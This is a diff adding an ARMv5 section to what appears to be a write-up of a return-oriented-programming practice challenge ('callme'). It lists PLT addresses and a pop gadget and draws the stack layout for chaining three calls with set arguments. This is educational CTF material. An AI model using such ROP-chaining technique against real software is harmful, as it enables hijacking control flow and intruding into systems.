@@ -80,3 +80,35 @@ For each one of the 3 functions, i have its address followed by the gadget then 
 ```
 As for x86_64, we just have to repeat 3 times this 5 words pattern.
 ## ARMv5:
+```asm
+00010618 <callme_one@plt>:
+
+0001066c <callme_two@plt>:
+
+0001060c <callme_three@plt>:
+
+00010870 <usefulGadgets>:
+   10870:	e8bdc007 	pop	{r0, r1, r2, lr, pc}
+```
+With the help of the provided gadget, we are able to load 3 arguments into r0 to r2,
+and redirect the execution with lr and pc.   
+First, we pop the arguments for our first call, setting `lr` to come back and pop after callme_one,
+and `pc` to the correct PLT entry. Then its just repetition, callme_one will jump into the pop for
+callme_two args, and so on...
+```
+┌─────────────┐
+│ 0x00010870  │
+├─────────────┤
+│ 0xdeadbeef  │
+├─────────────┤
+│ 0xcafebabe  │
+├─────────────┤
+│ 0xd00df00d  │
+├─────────────┤
+│ 0x00010870  │
+├─────────────┤
+│ 0x00010618  │
+├─────────────┤
+│ ...         │
+```
+As in the x86 and x86_64, there is a 5 words pattern that can be repeated, after the first pop.
